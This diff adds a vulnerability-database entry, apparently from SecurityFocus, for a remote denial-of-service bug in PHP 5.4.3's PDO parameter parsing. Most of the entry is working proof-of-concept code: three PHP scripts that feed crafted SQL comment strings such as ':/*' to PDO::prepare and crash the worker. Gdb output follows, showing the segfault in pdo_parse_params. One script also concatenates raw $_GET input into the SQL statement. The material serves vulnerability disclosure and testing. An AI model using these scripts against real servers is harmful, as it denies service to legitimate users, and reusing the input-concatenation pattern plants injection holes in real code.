@@ -1,0 +1,98 @@
+source: http://www.securityfocus.com/bid/54777/info
+
+PHP is prone to a remote denial-of-service vulnerability.
+
+An attacker can exploit this issue to cause the web server to crash, denying service to legitimate users.
+
+PHP 5.4.3 is vulnerable; other versions may also be affected. 
+
+<?php
+ try {
+ $db = new PDO('mysql:host=localhost;dbname=aws', "root", "");
+ //tokens: 
+ // SELECT;*;from;'user';/*
+ //$sql = "SELECT * from 'user'/*";
+ $stmt = $db->prepare("SELECT * from 'user'".mysql_real_escape_string($_GET['query']));
+ $stmt->execute();
+ //crash
+ $stmt->bindColumn(2, $type, PDO::PARAM_STR, 256);
+ $stmt->fetch(PDO::FETCH_BOUND);
+ print_r( $type);
+ }
+ catch (Exception $e)
+ {
+ echo "Failed: " . $e->getMessage();
+ }
+ ?>
+ -----
+ <?php
+try {
+$db = new PDO('mysql:host=localhost;dbname=aws', "root", "");
+
+//tokens:
+// SELECT;*;from;'user';/* 
+$sql = ":/*";
+
+$stmt = $db->prepare($sql);
+$stmt->execute();     // crashes php worker in pdo_parse_params()
+
+$stmt->bindColumn(2, $type, PDO::PARAM_STR, 256);
+$stmt->fetch(PDO::FETCH_BOUND);
+print_r( $type);
+
+} catch (Exception $e) {
+  echo "Failed: " . $e->getMessage();
+}
+
+?>
+---
+
+<pre>
+<?php
+echo "hmm beginning\n";
+try {
+$db = new PDO('mysql:host=localhost;dbname=aws', "root", "");
+echo "lets get it on\n";
+//tokens:
+// SELECT;*;from;'user';/* 
+$sql = "SELECT * from user :/**";
+echo $sql;
+$stmt = $db->prepare($sql);
+echo "prepared :)\n";
+print_r($stmt);
+$stmt->execute();     // crashes php worker in pdo_parse_params()
+print_r($stmt);
+echo "executed :(\n";
+$stmt->bindColumn(2, $type, PDO::PARAM_STR, 256);
+$stmt->fetch(PDO::FETCH_BOUND);
+echo "--data-\n";
+print_r( $type);
+echo "--data--\n";
+
+} catch (Exception $e) {
+        echo "EXCEPTION";
+  echo "Failed: " . $e->getMessage();
+}
+echo "hmmm end\n";
+?>
+</pre>
+
+Actual result:
+--------------
+root@bt:/opt/lampp# gdb ./bin/php 
+(gdb) run poc_pdo_linux_short_1.php
+Starting program: /opt/lampp/bin/php /opt/lampp/poc_pdo_linux_short_1.php
+[Thread debugging using libthread_db enabled]
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08228a81 in ?? ()
+(gdb) bt
+#0  0x08228a81 in ?? ()
+#1  0x082280eb in pdo_parse_params ()
+#2  0x08223891 in ?? ()
+#3  0x084b2aad in ?? ()
+#4  0x084b1f87 in execute ()
+#5  0x08490ed2 in zend_execute_scripts ()
+#6  0x0843f13c in php_execute_script ()
+#7  0x08506b46 in main ()
+
